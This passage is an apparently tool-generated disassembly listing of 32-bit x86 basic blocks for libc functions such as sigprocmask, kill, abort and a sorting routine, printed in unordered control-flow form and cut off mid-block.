0xb02e80d:	mov	ecx, edx
0xb02e80f:	shr	ecx, 2
0xb02e812:	test	dl, 2
0xb02e815:	rep movsd	dword ptr es:[edi], dword ptr [esi]
None
|
|
|
v
0xb02e8cf:	mov	edx, dword ptr [ebx - 0xdc]
0xb02e8d5:	neg	eax
0xb02e8d7:	mov	ecx, dword ptr gs:[0]
0xb02e8de:	mov	dword ptr [ecx + edx], eax
0xb02e8e1:	or	eax, 0xffffffff
0xb02e8e4:	jmp	0xb02e7ca
None
|
|
|
v
0xb02e868:	jmp	0xb02e848
None
|
|
|
v
0xb02e77e:	mov	dword ptr [esp + 0xc], eax
0xb02e782:	test	edx, edx
0xb02e784:	je	0xb02e870
None
|
|
|
v
0xb02e801:	test	edi, 2
0xb02e807:	jne	0xb02e898
None
|
|
|
v
0xb02e77c:	rep movsd	dword ptr es:[edi], dword ptr [esi]
None
|
|
|
v
0xb02e7dc:	mov	edx, dword ptr [esp + 0x94]
0xb02e7e3:	lea	edi, dword ptr [ebp + 4]
0xb02e7e6:	test	edi, 1
0xb02e7ec:	lea	esi, dword ptr [esp + 0xa0]
0xb02e7f3:	mov	dword ptr [ebp], edx
0xb02e7f6:	mov	edx, 0x80
0xb02e7fb:	jne	0xb02e8b0
None
|
|
|
v
0xb02e898:	movzx	ecx, word ptr [esi]
0xb02e89b:	add	edi, 2
0xb02e89e:	add	esi, 2
0xb02e8a1:	sub	edx, 2
0xb02e8a4:	mov	word ptr [edi - 2], cx
0xb02e8a8:	jmp	0xb02e80d
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sigprocmask
TOTAL BLOCKS :11
0xb02e984:	sub	esp, -0x80
0xb02e987:	pop	ebx
0xb02e988:	pop	esi
0xb02e989:	pop	edi
0xb02e98a:	ret	
None
|
|
|
v
0xb02e996:	rep movsd	dword ptr es:[edi], dword ptr [esi]
None
|
|
|
v
0xb02e94c:	mov	edx, dword ptr [eax]
0xb02e94e:	test	edx, edx
0xb02e950:	js	0xb02e98b
None
|
|
|
v
0xb02e942:	add	ebx, 0x17c6be
0xb02e948:	test	eax, eax
0xb02e94a:	je	0xb02e958
None
|
|
|
v
0xb02e998:	and	dword ptr [esp], 0x7fffffff
0xb02e99f:	and	dword ptr [esp + 4], 0xfffffffe
0xb02e9a4:	jmp	0xb02e958
None
|
|
|
v
0xb02e958:	mov	esi, 8
0xb02e95d:	mov	edx, dword ptr [esp + 0x98]
0xb02e964:	mov	ecx, eax
0xb02e966:	mov	edi, dword ptr [esp + 0x90]
0xb02e96d:	xchg	edi, ebx
0xb02e96f:	mov	eax, 0xaf
0xb02e974:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb02e952:	test	byte ptr [eax + 4], 1
0xb02e956:	jne	0xb02e98b
None
|
|
|
v
0xb02e9a6:	mov	edx, dword ptr [ebx - 0xdc]
0xb02e9ac:	neg	eax
0xb02e9ae:	mov	ecx, dword ptr gs:[0]
0xb02e9b5:	mov	dword ptr [ecx + edx], eax
0xb02e9b8:	or	eax, 0xffffffff
0xb02e9bb:	jmp	0xb02e984
None
|
|
|
v
0xb02e97b:	xchg	ebx, edi
0xb02e97d:	cmp	eax, 0xfffff000
0xb02e982:	ja	0xb02e9a6
None
|
|
|
v
0xb02e930:	push	edi
0xb02e931:	push	esi
0xb02e932:	push	ebx
0xb02e933:	add	esp, -0x80
0xb02e936:	mov	eax, dword ptr [esp + 0x94]
0xb02e93d:	call	0xb1267db
None
|
|
|
v
0xb02e98b:	mov	esi, eax
0xb02e98d:	mov	edi, esp
0xb02e98f:	mov	ecx, 0x20
0xb02e994:	mov	eax, esp
0xb02e996:	rep movsd	dword ptr es:[edi], dword ptr [esi]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:kill
TOTAL BLOCKS :5
0xb02e9c0:	mov	edx, ebx
0xb02e9c2:	mov	ecx, dword ptr [esp + 8]
0xb02e9c6:	mov	ebx, dword ptr [esp + 4]
0xb02e9ca:	mov	eax, 0x25
0xb02e9cf:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb02e9d6:	mov	ebx, edx
0xb02e9d8:	cmp	eax, 0xfffff001
0xb02e9dd:	jae	0xb02e9e0
None
|
|
|
v
0xb02e9e5:	add	ecx, 0x17c61b
0xb02e9eb:	mov	ecx, dword ptr [ecx - 0xdc]
0xb02e9f1:	neg	eax
0xb02e9f3:	add	ecx, dword ptr gs:[0]
0xb02e9fa:	mov	dword ptr [ecx], eax
0xb02e9fc:	or	eax, 0xffffffff
0xb02e9ff:	ret	
None
|
|
|
v
0xb02e9e0:	call	0xb1267df
None
|
|
|
v
0xb02e9df:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:abort
TOTAL BLOCKS :48
0xb031aee:	lea	edx, dword ptr [esp + 0x94]
0xb031af5:	xor	eax, eax
0xb031af7:	mov	ecx, 0x23
0xb031afc:	mov	edi, edx
0xb031afe:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0xb031b5f:	mov	eax, dword ptr [ebx + 0x11b4]
0xb031b65:	cmp	eax, 5
0xb031b68:	jne	0xb0319f6
None
|
|
|
v
0xb0319da:	cmp	eax, 3
0xb0319dd:	je	0xb031aee
None
|
|
|
v
0xb031b00:	lea	eax, dword ptr [esp + 0x114]
0xb031b07:	mov	dword ptr [ebx + 0x11b4], 4
0xb031b11:	mov	dword ptr [eax], 0xffffffff
0xb031b17:	sub	eax, 4
0xb031b1a:	cmp	eax, edx
0xb031b1c:	jne	0xb031b11
None
|
|
|
v
0xb0319ec:	cmp	eax, 5
0xb0319ef:	nop	
0xb0319f0:	je	0xb031b6e
None
|
|
|
v
0xb031a99:	lock sub	dword ptr [ebx + 0x11a8], 1
None
|
|
|
v
0xb031a18:	mov	dword ptr [esp + 8], 0
0xb031a20:	mov	dword ptr [esp + 4], edx
0xb031a24:	mov	dword ptr [esp], 1
0xb031a2b:	mov	dword ptr [ebx + 0x11b4], 1
0xb031a35:	mov	dword ptr [esp + 0x14], 0x20
0xb031a3d:	call	0xb02e930
None
|
|
|
v
0xb031ac2:	xor	eax, eax
0xb031ac4:	mov	ecx, 1
0xb031ac9:	cmp	dword ptr gs:[0xc], 0
0xb031ad1:	je	0xb031ad4
None
|
|
|
v
0xb031a16:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0xb031baa:	lea	ecx, dword ptr [ebx + 0x11a8]
0xb031bb0:	call	0xb0f9430
None
|
|
|
v
0xb0319d1:	cmp	eax, 2
0xb0319d4:	je	0xb031a72
None
|
|
|
v
0xb031aa7:	mov	dword ptr [esp], 6
0xb031aae:	call	0xb02e640
None
|
|
|
v
0xb031a42:	mov	eax, dword ptr [ebx + 0x11b4]
0xb031a48:	cmp	eax, 1
0xb031a4b:	jne	0xb0319d1
None
|
|
|
v
0xb0319f6:	cmp	eax, 6
0xb0319f9:	je	0xb031b93
None
|
|
|
v
0xb031ab3:	mov	edx, dword ptr gs:[8]
0xb031aba:	cmp	edx, dword ptr [ebx + 0x11b0]
0xb031ac0:	je	0xb031ae7
None
|
|
|
v
0xb0319e3:	cmp	eax, 4
0xb0319e6:	je	0xb031b50
None
|
|
|
v
0xb031aa1:	jne	0xb031bba
None
|
|
|
v
0xb031bba:	lea	eax, dword ptr [ebx + 0x11a8]
0xb031bc0:	call	0xb0f9460
None
|
|
|
v
0xb0319a3:	lock cmpxchg	dword ptr [ebx + 0x11a8], ecx
0xb0319ab:	jne	0xb031baa
None
|
|
|
v
0xb031a0b:	lea	edx, dword ptr [esp + 0x14]
0xb031a0f:	mov	ecx, 0x20
0xb031a14:	mov	edi, edx
0xb031a16:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0xb031a4d:	mov	dword ptr [esp], 0
0xb031a54:	mov	dword ptr [ebx + 0x11b4], 2
0xb031a5e:	call	0xb071350
None
|
|
|
v
0xb031b11:	mov	dword ptr [eax], 0xffffffff
0xb031b17:	sub	eax, 4
0xb031b1a:	cmp	eax, edx
0xb031b1c:	jne	0xb031b11
None
|
|
|
v
0xb031bca:	lea	ecx, dword ptr [ebx + 0x11a8]
0xb031bd0:	call	0xb0f9430
None
|
|
|
v
0xb031b94:	mov	dword ptr [esp], 0x7f
0xb031b9b:	mov	dword ptr [ebx + 0x11b4], 8
0xb031ba5:	call	0xb0b5f24
None
|
|
|
v
0xb0319b7:	mov	eax, dword ptr [ebx + 0x11b4]
0xb0319bd:	add	dword ptr [ebx + 0x11ac], 1
0xb0319c4:	test	eax, eax
0xb0319c6:	je	0xb031a0b
None
|
|
|
v
0xb031afe:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0xb031992:	xor	eax, eax
0xb031994:	mov	ecx, 1
0xb031999:	cmp	dword ptr gs:[0xc], 0
0xb0319a1:	je	0xb0319a4
None
|
|
|
v
0xb031b41:	mov	eax, dword ptr [ebx + 0x11b4]
0xb031b47:	cmp	eax, 4
0xb031b4a:	jne	0xb0319ec
None
|
|
|
v
0xb0319c8:	cmp	eax, 1
0xb0319cb:	je	0xb031a4d
None
|
|
|
v
0xb031bb5:	jmp	0xb0319b1
None
|
|
|
v
0xb0319b1:	mov	dword ptr [ebx + 0x11b0], edx
0xb0319b7:	mov	eax, dword ptr [ebx + 0x11b4]
0xb0319bd:	add	dword ptr [ebx + 0x11ac], 1
0xb0319c4:	test	eax, eax
0xb0319c6:	je	0xb031a0b
None
|
|
|
v
0xb031977:	add	ebx, 0x179689
0xb03197d:	sub	esp, 0x124
0xb031983:	mov	edx, dword ptr gs:[8]
0xb03198a:	cmp	edx, dword ptr [ebx + 0x11b0]
0xb031990:	je	0xb0319b7
None
|
|
|
v
0xb031a63:	mov	eax, dword ptr [ebx + 0x11b4]
0xb031a69:	cmp	eax, 2
0xb031a6c:	jne	0xb0319da
None
|
|
|
v
0xb031bc5:	jmp	0xb031aa7
None
|
|
|
v
0xb0319ff:	cmp	eax, 7
0xb031a02:	je	0xb031b94
None
|
|
|
v
0xb031b1e:	mov	dword ptr [esp + 8], 0
0xb031b26:	mov	dword ptr [esp + 4], eax
0xb031b2a:	mov	dword ptr [esp], 6
0xb031b31:	mov	dword ptr [esp + 0x118], 0
0xb031b3c:	call	0xb02e8f0
None
|
|
|
v
0xb031b84:	mov	eax, dword ptr [ebx + 0x11b4]
0xb031b8a:	cmp	eax, 6
0xb031b8d:	jne	0xb0319ff
None
|
|
|
v
0xb031ae1:	mov	dword ptr [ebx + 0x11b0], edx
0xb031ae7:	add	dword ptr [ebx + 0x11ac], 1
0xb031aee:	lea	edx, dword ptr [esp + 0x94]
0xb031af5:	xor	eax, eax
0xb031af7:	mov	ecx, 0x23
0xb031afc:	mov	edi, edx
0xb031afe:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0xb031ad3:	lock cmpxchg	dword ptr [ebx + 0x11a8], ecx
0xb031adb:	jne	0xb031bca
None
|
|
|
v
0xb031ae7:	add	dword ptr [ebx + 0x11ac], 1
0xb031aee:	lea	edx, dword ptr [esp + 0x94]
0xb031af5:	xor	eax, eax
0xb031af7:	mov	ecx, 0x23
0xb031afc:	mov	edi, edx
0xb031afe:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0xb031a08:	hlt	
None
|
|
|
v
0xb031a85:	mov	dword ptr [ebx + 0x11b0], 0
0xb031a8f:	cmp	dword ptr gs:[0xc], 0
0xb031a97:	je	0xb031a9a
None
|
|
|
v
0xb031a72:	sub	dword ptr [ebx + 0x11ac], 1
0xb031a79:	mov	dword ptr [ebx + 0x11b4], 0
0xb031a83:	jne	0xb031aa7
None
|
|
|
v
0xb031bd5:	jmp	0xb031ae1
None
|
|
|
v
0xb031b50:	mov	dword ptr [ebx + 0x11b4], 5
0xb031b5a:	call	0xb068330
None
|
|
|
v
0xb031b93:	hlt	
None
|
|
|
v
0xb031970:	push	edi
0xb031971:	push	ebx
0xb031972:	call	0xb1267db
None
|
|
|
v
0xb031b6e:	mov	dword ptr [esp], 6
0xb031b75:	mov	dword ptr [ebx + 0x11b4], 6
0xb031b7f:	call	0xb02e640
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b031c50
TOTAL BLOCKS :71
0xb032010:	jne	0xb031df9
None
|
|
|
v
0xb031c86:	sub	eax, 1
0xb031c89:	mov	edi, dword ptr [esp + 0x158]
0xb031c90:	imul	eax, dword ptr [esp + 0x158]
0xb031c98:	add	eax, dword ptr [esp + 0x150]
0xb031c9f:	mov	dword ptr [esp + 0x40], 0
0xb031ca7:	neg	edi
0xb031ca9:	mov	dword ptr [esp + 0x3c], eax
0xb031cad:	mov	dword ptr [esp + 0x28], eax
0xb031cb1:	mov	eax, dword ptr [esp + 0x150]
0xb031cb8:	mov	dword ptr [esp + 0x44], 0
0xb031cc0:	mov	dword ptr [esp + 0x18], edi
0xb031cc4:	mov	dword ptr [esp + 0x2c], eax
0xb031cc8:	lea	eax, dword ptr [esp + 0x48]
0xb031ccc:	mov	dword ptr [esp + 0x30], eax
0xb031cd0:	lea	eax, dword ptr [esp + 0x40]
0xb031cd4:	mov	dword ptr [esp + 0x38], eax
0xb031cd8:	mov	ecx, dword ptr [esp + 0x2c]
0xb031cdc:	xor	edx, edx
0xb031cde:	mov	eax, dword ptr [esp + 0x28]
0xb031ce2:	sub	eax, ecx
0xb031ce4:	div	dword ptr [esp + 0x158]
0xb031ceb:	shr	eax, 1
0xb031ced:	imul	eax, dword ptr [esp + 0x158]
0xb031cf5:	mov	edi, eax
0xb031cf7:	mov	eax, ecx
0xb031cf9:	add	edi, ecx
0xb031cfb:	mov	ecx, dword ptr [esp + 0x160]
0xb031d02:	mov	dword ptr [esp + 4], eax
0xb031d06:	mov	dword ptr [esp], edi
0xb031d09:	mov	dword ptr [esp + 8], ecx
0xb031d0d:	call	ebp
None
|
|
|
v
0xb031fd8:	mov	ecx, eax
0xb031fda:	mov	eax, edx
0xb031fdc:	movzx	edx, byte ptr [eax]
0xb031fdf:	mov	byte ptr [ecx], dl
0xb031fe1:	lea	edx, dword ptr [eax + edi]
0xb031fe4:	cmp	esi, edx
0xb031fe6:	jbe	0xb031fd8
None
|
|
|
v
0xb031ee9:	mov	ecx, dword ptr [esp + 0x158]
0xb031ef0:	mov	eax, dword ptr [esp + 0x150]
0xb031ef7:	add	ecx, esi
0xb031ef9:	mov	esi, ecx
0xb031efb:	nop	
0xb031efc:	lea	esi, dword ptr [esi]
0xb031f00:	movzx	ecx, byte ptr [edi]
0xb031f03:	add	edi, 1
0xb031f06:	add	eax, 1
0xb031f09:	movzx	edx, byte ptr [eax - 1]
0xb031f0d:	cmp	edi, esi
0xb031f0f:	mov	byte ptr [edi - 1], dl
0xb031f12:	mov	byte ptr [eax - 1], cl
0xb031f15:	jne	0xb031f00
None
|
|
|
v
0xb031c6f:	mov	edi, dword ptr [esp + 0x158]
0xb031c76:	shl	edi, 2
0xb031c79:	cmp	eax, 4
0xb031c7c:	mov	dword ptr [esp + 0x34], edi
0xb031c80:	jbe	0xb031e62
None
|
|
|
v
0xb03216e:	mov	edi, dword ptr [esp + 0x1c]
0xb032172:	add	dword ptr [esp + 0x30], 8
0xb032177:	mov	dword ptr [eax], edi
0xb032179:	mov	edi, dword ptr [esp + 0x28]
0xb03217d:	mov	dword ptr [esp + 0x28], esi
0xb032181:	mov	dword ptr [eax + 4], edi
0xb032184:	jmp	0xb031e40
None
|
|
|
v
0xb031e78:	mov	eax, dword ptr [esp + 0x28]
0xb031e7c:	mov	esi, dword ptr [esp + 0x34]
0xb031e80:	add	esi, dword ptr [esp + 0x150]
0xb031e87:	mov	edi, dword ptr [esp + 0x150]
0xb031e8e:	cmp	eax, esi
0xb031e90:	cmovbe	esi, eax
0xb031e93:	mov	eax, dword ptr [esp + 0x150]
0xb031e9a:	add	eax, dword ptr [esp + 0x158]
0xb031ea1:	mov	ecx, esi
0xb031ea3:	mov	dword ptr [esp + 0x14], esi
0xb031ea7:	cmp	ecx, eax
0xb031ea9:	mov	dword ptr [esp + 0x1c], eax
0xb031ead:	jb	0xb031f17
None
|
|
|
v
0xb0320e0:	mov	eax, dword ptr [esp + 0x160]
0xb0320e7:	mov	dword ptr [esp], edi
0xb0320ea:	mov	dword ptr [esp + 8], eax
0xb0320ee:	mov	eax, dword ptr [esp + 0x2c]
0xb0320f2:	mov	dword ptr [esp + 4], eax
0xb0320f6:	call	ebp
None
|
|
|
v
0xb032053:	mov	edi, dword ptr [esp + 0x2c]
0xb032057:	mov	dword ptr [eax + 4], esi
0xb03205a:	add	dword ptr [esp + 0x30], 8
0xb03205f:	mov	dword ptr [eax], edi
0xb032061:	mov	eax, dword ptr [esp + 0x1c]
0xb032065:	mov	dword ptr [esp + 0x2c], eax
0xb032069:	jmp	0xb031e40
None
|
|
|
v
0xb031f38:	mov	eax, dword ptr [esp + 0x158]
0xb031f3f:	add	dword ptr [esp + 0x1c], eax
0xb031f43:	mov	eax, dword ptr [esp + 0x28]
0xb031f47:	cmp	dword ptr [esp + 0x1c], eax
0xb031f4b:	ja	0xb031e58
None
|
|
|
v
0xb031ecc:	test	eax, eax
0xb031ece:	cmovs	esi, edi
0xb031ed1:	add	edi, dword ptr [esp + 0x158]
0xb031ed8:	cmp	dword ptr [esp + 0x14], edi
0xb031edc:	jae	0xb031eb8
None
|
|
|
v
0xb031e4e:	mov	eax, dword ptr [esp + 0x3c]
0xb031e52:	mov	dword ptr [esp + 0x28], eax
0xb031e56:	jmp	0xb031e78
None
|
|
|
v
0xb031d0f:	test	eax, eax
0xb031d11:	js	0xb03212b
None
|
|
|
v
0xb031f86:	add	esi, dword ptr [esp + 0x158]
0xb031f8d:	cmp	esi, dword ptr [esp + 0x1c]
0xb031f91:	je	0xb03208c
None
|
|
|
v
0xb032016:	add	esi, dword ptr [esp + 0x18]
0xb03201a:	mov	eax, dword ptr [esp + 0x158]
0xb032021:	add	dword ptr [esp + 0x1c], eax
0xb032025:	mov	eax, esi
0xb032027:	sub	eax, dword ptr [esp + 0x2c]
0xb03202b:	cmp	dword ptr [esp + 0x34], eax
0xb03202f:	jae	0xb031e13
None
|
|
|
v
0xb031fb8:	mov	ecx, dword ptr [esp + 0x14]
0xb031fbc:	movzx	eax, byte ptr [ebp]
0xb031fc0:	cmp	esi, ecx
0xb031fc2:	mov	byte ptr [esp + 0x18], al
0xb031fc6:	mov	eax, ecx
0xb031fc8:	ja	0xb03207e
None
|
|
|
v
0xb031d50:	mov	eax, dword ptr [esp + 0x160]
0xb031d57:	mov	dword ptr [esp + 4], edi
0xb031d5b:	mov	dword ptr [esp + 8], eax
0xb031d5f:	mov	eax, dword ptr [esp + 0x1c]
0xb031d63:	mov	dword ptr [esp], eax
0xb031d66:	call	ebp
None
|
|
|
v
0xb031c50:	push	ebp
0xb031c51:	push	edi
0xb031c52:	push	esi
0xb031c53:	sub	esp, 0x140
0xb031c59:	mov	eax, dword ptr [esp + 0x154]
0xb031c60:	mov	ebp, dword ptr [esp + 0x15c]
0xb031c67:	test	eax, eax
0xb031c69:	je	0xb031e58
None
|
|
|
v
0xb031d37:	mov	eax, dword ptr [esp + 0x2c]
0xb031d3b:	add	eax, dword ptr [esp + 0x158]
0xb031d42:	mov	esi, dword ptr [esp + 0x28]
0xb031d46:	add	esi, dword ptr [esp + 0x18]
0xb031d4a:	mov	dword ptr [esp + 0x1c], eax
0xb031d4e:	nop	
0xb031d50:	mov	eax, dword ptr [esp + 0x160]
0xb031d57:	mov	dword ptr [esp + 4], edi
0xb031d5b:	mov	dword ptr [esp + 8], eax
0xb031d5f:	mov	eax, dword ptr [esp + 0x1c]
0xb031d63:	mov	dword ptr [esp], eax
0xb031d66:	call	ebp
None
|
|
|
v
0xb03207e:	mov	eax, ebp
0xb032080:	jmp	0xb031fe8
None
|
|
|
v
0xb031d78:	add	esi, dword ptr [esp + 0x18]
0xb031d7c:	mov	eax, dword ptr [esp + 0x160]
0xb031d83:	mov	dword ptr [esp + 4], esi
0xb031d87:	mov	dword ptr [esp], edi
0xb031d8a:	mov	dword ptr [esp + 8], eax
0xb031d8e:	call	ebp
None
|
|
|
v
0xb031dd8:	mov	eax, dword ptr [esp + 0x1c]
0xb031ddc:	mov	esi, dword ptr [esp + 0x24]
0xb031de0:	cmp	edi, eax
0xb031de2:	je	0xb032085
None
|
|
|
v
0xb031fe8:	movzx	ecx, byte ptr [esp + 0x18]
0xb031fed:	sub	ebp, 1
0xb031ff0:	sub	dword ptr [esp + 0x14], 1
0xb031ff5:	cmp	ebp, dword ptr [esp + 0x20]
0xb031ff9:	mov	byte ptr [eax], cl
0xb031ffb:	jne	0xb031fb8
None
|
|
|
v
0xb032106:	movzx	ecx, byte ptr [eax]
0xb032109:	add	eax, 1
0xb03210c:	add	edx, 1
0xb03210f:	mov	byte ptr [esp + 0x14], cl
0xb032113:	movzx	ecx, byte ptr [edx - 1]
0xb032117:	cmp	esi, eax
0xb032119:	mov	byte ptr [eax - 1], cl
0xb03211c:	movzx	ecx, byte ptr [esp + 0x14]
0xb032121:	mov	byte ptr [edx - 1], cl
0xb032124:	jne	0xb032106
None
|
|
|
v
0xb031ede:	cmp	esi, dword ptr [esp + 0x150]
0xb031ee5:	mov	edi, esi
0xb031ee7:	je	0xb031f17
None
|
|
|
v
0xb031f6a:	mov	eax, dword ptr [esp + 0x160]
0xb031f71:	mov	dword ptr [esp + 4], esi
0xb031f75:	mov	dword ptr [esp + 8], eax
0xb031f79:	mov	eax, dword ptr [esp + 0x1c]
0xb031f7d:	mov	dword ptr [esp], eax
0xb031f80:	call	ebp
None
|
|
|
v
0xb031d7c:	mov	eax, dword ptr [esp + 0x160]
0xb031d83:	mov	dword ptr [esp + 4], esi
0xb031d87:	mov	dword ptr [esp], edi
0xb031d8a:	mov	dword ptr [esp + 8], eax
0xb031d8e:	call	ebp
None
|
|
|
v
0xb032160:	jmp	0xb031d17
None
|
|
|
v
0xb031f17:	mov	edi, dword ptr [esp + 0x158]
0xb031f1e:	mov	eax, dword ptr [esp + 0x1c]
0xb031f22:	mov	dword ptr [esp + 0x15c], ebp
0xb031f29:	lea	eax, dword ptr [eax + edi - 1]
0xb031f2d:	neg	edi
0xb031f2f:	mov	dword ptr [esp + 0x20], eax
0xb031f33:	nop	
0xb031f34:	lea	esi, dword ptr [esi]
0xb031f38:	mov	eax, dword ptr [esp + 0x158]
0xb031f3f:	add	dword ptr [esp + 0x1c], eax
0xb031f43:	mov	eax, dword ptr [esp + 0x28]
0xb031f47:	cmp	dword ptr [esp + 0x1c], eax
0xb031f4b:	ja	0xb031e58
None
|
|
|
v
0xb031e40:	mov	eax, dword ptr [esp + 0x38]
0xb031e44:	cmp	dword ptr [esp + 0x30], eax
0xb031e48:	ja	0xb031cd8
None
|
|
|
v
0xb031e03:	mov	eax, esi
0xb031e05:	sub	eax, dword ptr [esp + 0x2c]
0xb031e09:	cmp	dword ptr [esp + 0x34], eax
0xb031e0d:	jb	0xb032035
None
|
|
|
v
0xb031d2f:	test	eax, eax
0xb031d31:	js	0xb0320aa
None
|
|
|
v
0xb031fdc:	movzx	edx, byte ptr [eax]
0xb031fdf:	mov	byte ptr [ecx], dl
0xb031fe1:	lea	edx, dword ptr [eax + edi]
0xb031fe4:	cmp	esi, edx
0xb031fe6:	jbe	0xb031fd8
None
|
|
|
v
0xb0320aa:	mov	esi, dword ptr [esp + 0x158]
0xb0320b1:	mov	eax, edi
0xb0320b3:	mov	edx, dword ptr [esp + 0x28]
0xb0320b7:	add	esi, edi
0xb0320b9:	lea	esi, dword ptr [esi]
0xb0320c0:	movzx	ecx, byte ptr [eax]
0xb0320c3:	add	eax, 1
0xb0320c6:	add	edx, 1
0xb0320c9:	mov	byte ptr [esp + 0x14], cl
0xb0320cd:	movzx	ecx, byte ptr [edx - 1]
0xb0320d1:	cmp	eax, esi
0xb0320d3:	mov	byte ptr [eax - 1], cl
0xb0320d6:	movzx	ecx, byte ptr [esp + 0x14]
0xb0320db:	mov	byte ptr [edx - 1], cl
0xb0320de:	jne	0xb0320c0
None
|
|
|
v
0xb031f68:	add	esi, edi
0xb031f6a:	mov	eax, dword ptr [esp + 0x160]
0xb031f71:	mov	dword ptr [esp + 4], esi
0xb031f75:	mov	dword ptr [esp + 8], eax
0xb031f79:	mov	eax, dword ptr [esp + 0x1c]
0xb031f7d:	mov	dword ptr [esp], eax
0xb031f80:	call	ebp
None
|
|
|
v
0xb031f97:	mov	edx, dword ptr [esp + 0x20]
0xb031f9b:	mov	eax, dword ptr [esp + 0x158]
0xb031fa2:	add	eax, edx
0xb031fa4:	cmp	dword ptr [esp + 0x1c], eax
0xb031fa8:	mov	ebp, eax
0xb031faa:	mov	dword ptr [esp + 0x24], eax
0xb031fae:	ja	0xb031ffd
None
|
|
|
v
0xb031df9:	cmp	dword ptr [esp + 0x1c], esi
0xb031dfd:	jbe	0xb031d50
None
|
|
|
v
0xb03206e:	mov	eax, dword ptr [esp + 0x158]
0xb032075:	add	dword ptr [esp + 0x1c], eax
0xb032079:	jmp	0xb031d50
None
|
|
|
v
0xb031db8:	movzx	ecx, byte ptr [eax]
0xb031dbb:	add	eax, 1
0xb031dbe:	add	edx, 1
0xb031dc1:	mov	byte ptr [esp + 0x14], cl
0xb031dc5:	movzx	ecx, byte ptr [edx - 1]
0xb031dc9:	cmp	eax, esi
0xb031dcb:	mov	byte ptr [eax - 1], cl
0xb031dce:	movzx	ecx, byte ptr [esp + 0x14]
0xb031dd3:	mov	byte ptr [edx - 1], cl
0xb031dd6:	jne	0xb031db8
None
|
|
|
v
0xb031d90:	test	eax, eax
0xb031d92:	js	0xb031d78
None
|
|
|
v
0xb032047:	cmp	eax, edx
0xb032049:	mov	eax, dword ptr [esp + 0x30]
0xb03204d:	jle	0xb03216e
None
|
|
|
v
0xb031fce:	mov	ecx, ebp
0xb031fd0:	jmp	0xb031fdc
None
|
|
|
v
0xb031e13:	mov	edi, dword ptr [esp + 0x1c]
0xb031e17:	mov	eax, dword ptr [esp + 0x28]
0xb031e1b:	mov	dword ptr [esp + 0x2c], edi
0xb031e1f:	sub	eax, edi
0xb031e21:	cmp	dword ptr [esp + 0x34], eax
0xb031e25:	jb	0xb031e40
None
|
|
|
v
0xb031e27:	mov	eax, dword ptr [esp + 0x30]
0xb031e2b:	mov	edi, dword ptr [eax - 8]
0xb031e2e:	sub	eax, 8
0xb031e31:	mov	dword ptr [esp + 0x2c], edi
0xb031e35:	mov	edi, dword ptr [eax + 4]
0xb031e38:	mov	dword ptr [esp + 0x30], eax
0xb031e3c:	mov	dword ptr [esp + 0x28], edi
0xb031e40:	mov	eax, dword ptr [esp + 0x38]
0xb031e44:	cmp	dword ptr [esp + 0x30], eax
0xb031e48:	ja	0xb031cd8
None
|
|
|
v
0xb031f51:	mov	esi, dword ptr [esp + 0x1c]
0xb031f55:	sub	esi, dword ptr [esp + 0x158]
0xb031f5c:	mov	ebp, dword ptr [esp + 0x15c]
0xb031f63:	jmp	0xb031f6a
None
|
|
|
v
0xb032100:	mov	edx, dword ptr [esp + 0x2c]
0xb032104:	mov	eax, edi
0xb032106:	movzx	ecx, byte ptr [eax]
0xb032109:	add	eax, 1
0xb03210c:	add	edx, 1
0xb03210f:	mov	byte ptr [esp + 0x14], cl
0xb032113:	movzx	ecx, byte ptr [edx - 1]
0xb032117:	cmp	esi, eax
0xb032119:	mov	byte ptr [eax - 1], cl
0xb03211c:	movzx	ecx, byte ptr [esp + 0x14]
0xb032121:	mov	byte ptr [edx - 1], cl
0xb032124:	jne	0xb032106
None
|
|
|
v
0xb031e62:	sub	eax, 1
0xb031e65:	imul	eax, dword ptr [esp + 0x158]
0xb031e6d:	add	eax, dword ptr [esp + 0x150]
0xb031e74:	mov	dword ptr [esp + 0x28], eax
0xb031e78:	mov	eax, dword ptr [esp + 0x28]
0xb031e7c:	mov	esi, dword ptr [esp + 0x34]
0xb031e80:	add	esi, dword ptr [esp + 0x150]
0xb031e87:	mov	edi, dword ptr [esp + 0x150]
0xb031e8e:	cmp	eax, esi
0xb031e90:	cmovbe	esi, eax
0xb031e93:	mov	eax, dword ptr [esp + 0x150]
0xb031e9a:	add	eax, dword ptr [esp + 0x158]
0xb031ea1:	mov	ecx, esi
0xb031ea3:	mov	dword ptr [esp + 0x14], esi
0xb031ea7:	cmp	ecx, eax
0xb031ea9:	mov	dword ptr [esp + 0x1c], eax
0xb031ead:	jb	0xb031f17
None
|
|
|
v
0xb0320c0:	movzx	ecx, byte ptr [eax]
0xb0320c3:	add	eax, 1
0xb0320c6:	add	edx, 1
0xb0320c9:	mov	byte ptr [esp + 0x14], cl
0xb0320cd:	movzx	ecx, byte ptr [edx - 1]
0xb0320d1:	cmp	eax, esi
0xb0320d3:	mov	byte ptr [eax - 1], cl
0xb0320d6:	movzx	ecx, byte ptr [esp + 0x14]
0xb0320db:	mov	byte ptr [edx - 1], cl
0xb0320de:	jne	0xb0320c0
None
|
|
|
v
0xb031ffd:	mov	eax, dword ptr [esp + 0x24]
0xb032001:	mov	dword ptr [esp + 0x20], eax
0xb032005:	jmp	0xb031f38
None
|
|
|
v
0xb031cd8:	mov	ecx, dword ptr [esp + 0x2c]
0xb031cdc:	xor	edx, edx
0xb031cde:	mov	eax, dword ptr [esp + 0x28]
0xb031ce2:	sub	eax, ecx
0xb031ce4:	div	dword ptr [esp + 0x158]
0xb031ceb:	shr	eax, 1
0xb031ced:	imul	eax, dword ptr [esp + 0x158]
0xb031cf5:	mov	edi, eax
0xb031cf7:	mov	eax, ecx
0xb031cf9:	add	edi, ecx
0xb031cfb:	mov	ecx, dword ptr [esp + 0x160]
0xb031d02:	mov	dword ptr [esp + 4], eax
